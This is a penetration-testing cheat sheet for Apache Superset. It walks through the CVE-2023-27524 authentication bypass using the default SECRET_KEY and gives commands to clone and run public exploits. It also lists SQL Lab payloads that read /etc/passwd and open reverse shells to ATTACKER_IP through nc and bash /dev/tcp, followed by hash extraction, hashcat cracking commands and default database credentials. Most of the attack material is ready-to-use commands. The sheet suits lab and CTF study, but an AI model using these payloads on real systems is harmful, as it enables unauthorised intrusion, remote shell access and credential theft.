# Apache Superset

Data visualization and BI platform. Often runs on Werkzeug/Python.

**Default Port:** 8088

---

## Discovery

```bash
# Nmap
nmap -sV -p 8088 TARGET

# Indicators
# - Server header: Werkzeug/x.x.x Python/x.x.x
# - Title: "Superset"
# - Redirect to /login/
# - Endpoints: /health, /ping, /healthcheck
```

**Common Endpoints:**

```
/login/
/superset/welcome/
/superset/sqllab/
/superset/explore/
/health
/ping
/healthcheck
```

---

## CVE-2023-27524 - Auth Bypass (Default SECRET_KEY)

**Affects:** Apache Superset < 2.1.0

Superset uses Flask session cookies signed with a SECRET_KEY. Many instances use the default key, allowing attackers to forge admin session cookies.

### Default SECRET_KEY

```
b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h'
```

### Exploit - horizon3ai

```bash
git clone https://github.com/horizon3ai/CVE-2023-27524.git
cd CVE-2023-27524

python3 CVE-2023-27524.py --url http://TARGET:8088
```

**Output:**
```
Superset Version: 1.4.0
Vulnerable to CVE-2023-27524 - Using default SECRET_KEY
Forged session cookie for user 1: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0...
```

### Exploit - jakabakos (with RCE)

```bash
git clone https://github.com/jakabakos/CVE-2023-27524-Apache-Superset-Auth-Bypass-and-RCE.git
cd CVE-2023-27524-Apache-Superset-Auth-Bypass-and-RCE

# Enumerate databases
python3 exploit.py -u http://TARGET:8088 --enum-dbs

# Attempt reverse shell
python3 exploit.py -u http://TARGET:8088 --revshell ATTACKER_IP:PORT
```

### Manual Cookie Forge

Use the forged cookie in browser:
1. Open DevTools → Application → Cookies
2. Replace `session` cookie value with forged cookie
3. Refresh page → Logged in as admin

---

## Post-Auth Exploitation

### SQL Lab RCE (PostgreSQL Backend)

Once authenticated, access SQL Lab at `/superset/sqllab/`

**Read Local Files:**
```sql
CREATE TABLE read_files(output text);
COPY read_files FROM '/etc/passwd';
SELECT * FROM read_files;
```

**Reverse Shell:**
```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f';
```

**Alternative RCE:**
```sql
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"';
```

---

## Post-Exploitation

### Config Files

```
/home/*/superset/docker/.env          # Docker environment
/home/*/.superset/superset.db         # SQLite database with user hashes
/app/superset_config.py               # Main config
```

### Extract Password Hashes

```bash
# SQLite database location
/home/tom/.superset/superset.db

# Query for users
sqlite3 superset.db "SELECT username, password FROM ab_user;"
```

**Hash Format (PBKDF2-SHA256):**
```
pbkdf2:sha256:150000$wp3NugwQ$7e09694d2b07c70a67b7817dee361e8e06191f50f04163c37aa01bea24ec94f1
```

### Cracking Superset/Flask Hashes

Convert to hashcat format:
```
pbkdf2:sha256:150000$SALT$HASH
→
sha256:150000:SALT:HASH
```

```bash
# Hashcat mode 10900 (PBKDF2-HMAC-SHA256)
hashcat -m 10900 -a 0 'sha256:150000:wp3NugwQ:7e09694d2b07c70a67b7817dee361e8e06191f50f04163c37aa01bea24ec94f1' /usr/share/wordlists/rockyou.txt
```

---

## Database Connection Info

If you have access to SQL Lab, database credentials are visible in the connection settings or can be extracted:

```sql
-- In SQL Lab, check connection string
-- Usually format: postgresql+psycopg2://USER:PASS@HOST:PORT/DBNAME
```

**Common default connection:**
```
Host: 127.0.0.1:5432
User: dbuser / superset
Pass: dbpass / superset
DB: employees / superset
```

---

## References

- https://github.com/horizon3ai/CVE-2023-27524
- https://github.com/jakabakos/CVE-2023-27524-Apache-Superset-Auth-Bypass-and-RCE
